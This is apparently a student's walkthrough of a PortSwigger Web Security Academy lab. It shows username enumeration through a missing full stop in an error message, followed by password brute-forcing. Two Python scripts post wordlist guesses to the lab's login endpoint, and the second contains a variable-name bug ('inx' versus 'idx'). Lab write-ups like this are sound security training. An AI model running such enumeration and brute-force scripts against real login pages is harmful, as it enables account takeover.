lab 2

first of all, log in to the lab and go to /my account. you can see login form. then we enterd username and password but we can see a error massege "Invalid username or password."
then we can see somthing specific in the error massege. this is a full stop at the end of error message

<img width="1696" height="758" alt="image" src="https://github.com/user-attachments/assets/3e37b6eb-7824-48a2-b787-bccbfc16c907" />

We captured the login request and sent it with dummy credentials in burpsuit

<img width="921" height="880" alt="image" src="https://github.com/user-attachments/assets/e03e31f2-e783-4e9e-b0e9-c0eb0425af04" />

we wrote python script to idintify valid username. python script to check different response like what are the not fullstop response

```import requests
from pathlib import Path
 
TARGET_URL = "https://0ac800df0392f42b810de86700cb0074.web-security-academy.net/login"
WORDLIST = "usernames.txt"
PASSWORD = "password123"
FAIL_SIG = "Invalid username or password."
 
wordlist_path = Path(WORDLIST)
if not wordlist_path.exists():
    raise SystemExit(f"Wordlist not found: {wordlist_path.resolve()}")
 
for username in wordlist_path.read_text().splitlines():
    username = username.strip()
    if not username:
        continue
    data = {
        "username": username,
        "password": PASSWORD
    }
    try:
        resp = requests.post(TARGET_URL, data=data, allow_redirects=False)
        if FAIL_SIG not in resp.text:
            print(f"[+] Possible valid username: {username}")
    except requests.RequestException as e:
        print(f"[!] Error testing username '{username}': {e}")
```

then we open  linux terminal type nano burpsuit_attack.py and save the python script. now  we use `python3 burpsuit_attack.py`  for run this code. finaly we can see valid username  under screeanshot

<img width="856" height="185" alt="image" src="https://github.com/user-attachments/assets/04b326b1-3de7-4618-8787-df231d6c3f04" />

We observed the missing dot in the response for the valid username:
We then used the script below to brute-force that user’s password:
```import requests
from pathlib import Path

TARGET_URL = "https://0a4b000a042fe0058286436b00c90051.web-security-academy.net/login"
USERNAME = "argentina"
WORDLIST = "passwords.txt"
FAIL_SIG = "Invalid username or password"

wordlist_path = Path(WORDLIST)
if not wordlist_path.exists():
    raise SystemExit(f"password wordlist not found: {wordlist_path.resolve()}")

passwords = wordlist_path.read_text().splitlines()
total = len(passwords)

for inx, password in enumerate(passwords, start=1):
    password = password.strip()
    if not password:
        continue
    print(f"[{idx}/{total}] Trying password : {password}", end="\r")
    data = {
        "username":USERNAME,
        "password": password
    }
    try:
        resp = requests.post(TARGET_URL, data =data, allow_redirects=False)
        if FAIL_SIG not in resp.text:
            print(f"\n[+] possible valid password found for {USERNAME}: {password}")
            break
    except requests.RequestException as e:
        print(f"\n error testing password '{password}': {e}")
```

<img width="533" height="186" alt="image" src="https://github.com/user-attachments/assets/551af594-6db3-4ece-9271-c10adeb76815" />


We logged in as the identified user and solved the lab:



<img width="1902" height="780" alt="image" src="https://github.com/user-attachments/assets/c8bb144a-876f-4327-8545-0e8e4fca7cc5" />












